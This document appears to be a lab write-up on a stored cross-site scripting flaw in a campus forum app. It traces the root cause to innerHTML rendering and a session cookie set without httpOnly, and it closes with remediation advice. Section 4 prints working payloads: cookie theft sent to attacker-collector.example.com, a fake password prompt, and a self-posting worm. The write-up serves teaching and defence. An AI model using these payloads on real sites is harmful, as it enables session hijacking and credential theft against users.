# Stored Cross-Site Scripting (XSS) Vulnerability Documentation:

## 1. Vulnerability Overview:
- Problem Statement: Stored Cross-Site Scripting occurs when an application stores user-supplied data in a database without prior validation or neutralization, and later renders that content in the web browser without proper contextual escaping.
- Persistent Nature: Because the malicious payload is stored in the database, any user who subsequently navigates to the affected page automatically triggers the payload.
- High Threat Impact: Attackers can execute arbitrary JavaScript in the victim browser context, potentially stealing session identifiers, performing unauthorized actions, or injecting fraudulent login prompts.

## 2. Root Cause Code Analysis:

### 2.1 Backend Data Ingestion (server/routes/posts.js):
- The server receives user input from the request body without sanitizing HTML tags or stripping executable scripts.
- The raw string is inserted directly into the SQLite database table comments.
- Code snippet: db.prepare("INSERT INTO comments (post_id, user_id, content) VALUES (?, ?, ?)").run(req.params.id, req.user.id, content).
- Notice that parameterized queries prevent SQL injection, but do not prevent Cross-Site Scripting because the database legitimately stores the raw string.

### 2.2 Frontend DOM Rendering (client/src/components/ContentRenderer.jsx):
- The React frontend receives the stored comment string from the REST API.
- The component inserts the string into the DOM using innerHTML to enable rich text formatting.
- Script tags and inline HTML event handlers such as onerror and onload are parsed and executed by the browser engine.
- Code snippet: containerRef.current.innerHTML = content.

### 2.3 Session Cookie Accessibility (server/routes/auth.js):
- The authentication module sets the session cookie without the httpOnly flag.
- Code snippet: res.cookie("session_token", token, { path: "/" }).
- Because httpOnly is absent, client-side JavaScript can directly read the authentication token via document.cookie.

## 3. Step-by-Step Attack Demonstration:

### Step 1: Attacker Account Access:
- The attacker logs into the forum using the account credentials for lucky or registers a new account.
- The attacker navigates to the first discussion thread titled Welcome to the IIIT-A Open Source Community Forum.

### Step 2: Injecting the Malicious Payload:
- In the Leave a Comment text area, the attacker inputs an HTML and JavaScript payload.
- Example Payload: <img src="invalid" onerror="alert('Stored XSS Triggered! Active Session Cookie: ' + document.cookie)">.
- The attacker clicks the Submit Comment button.
- The application sends a POST request to /api/posts/1/comments and stores the payload in the SQLite database.

### Step 3: Victim Navigation and Payload Trigger:
- An administrator such as Mridankan Mandal logs in on another browser or tab.
- The administrator navigates to the Discussions tab and clicks on Welcome to the IIIT-A Open Source Community Forum.
- The browser fetches the discussion comments and renders the attacker input directly into the DOM.
- The img element fails to load the source invalid, triggering the onerror event handler automatically.
- The JavaScript executes immediately within the administrator session context, popping up an alert box displaying the administrator session token.

## 4. Practical Exploit Examples and Explanations:

### Example 1: Proof-of-Concept Alert Dialog:
- Payload: <img src="x" onerror="alert('Stored XSS Executed on IIIT-A Forum! User: ' + document.cookie)">.
- Explanation: This payload verifies that arbitrary JavaScript execution is possible upon rendering. The img element deliberately uses an invalid image path x to force the browser to trigger the onerror event handler without requiring user clicks.

### Example 2: Session Cookie Exfiltration (Account Takeover):
- Payload: <img src="x" onerror="fetch('https://attacker-collector.example.com/log?cookie=' + encodeURIComponent(document.cookie))">.
- Explanation: This payload silently reads the victim session cookie via document.cookie and transmits it via an asynchronous HTTP GET request to an external attacker-controlled server. Once the attacker obtains the token, they can impersonate the administrator without knowing the password.

### Example 3: Injected Phishing Form (Credential Harvesting):
- Payload: <div style="border:2px solid #dc2626;padding:15px;background:#ffffff;border-radius:6px;margin:10px 0;"><h4 style="color:#dc2626;">Session Expired</h4><p>Please re-enter your campus password:</p><input type="password" id="phish_pass" placeholder="Password"><button onclick="alert('Stolen: ' + document.getElementById('phish_pass').value)">Confirm</button></div>.
- Explanation: This payload injects a fake authentication prompt directly into the legitimate forum discussion. Because the form appears within the trusted domain, unsuspecting users may enter sensitive credentials which are subsequently captured by the attacker.

### Example 4: Stored XSS Worm (Automated Action Execution):
- Payload: <script>fetch('/api/posts/1/comments',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'This thread has been compromised by an automated script.'})});</script>.
- Explanation: This payload uses the viewing victim active authenticated session to make a background POST request to the API, automatically submitting unauthorized comments on behalf of the victim.

## 5. Summary of Key Remediation Concepts for Version 2:
- Context-Aware Output Neutralization: Use libraries such as DOMPurify or default React safe text interpolation to strip executable scripts and hazardous attributes before inserting content into the DOM.
- HttpOnly Cookie Flags: Ensure all authentication cookies are configured with httpOnly: true and sameSite: strict so that client-side scripts cannot access session tokens.
- Content Security Policy (CSP): Enforce strict HTTP Content-Security-Policy response headers to restrict the browser from executing unauthorized inline scripts.
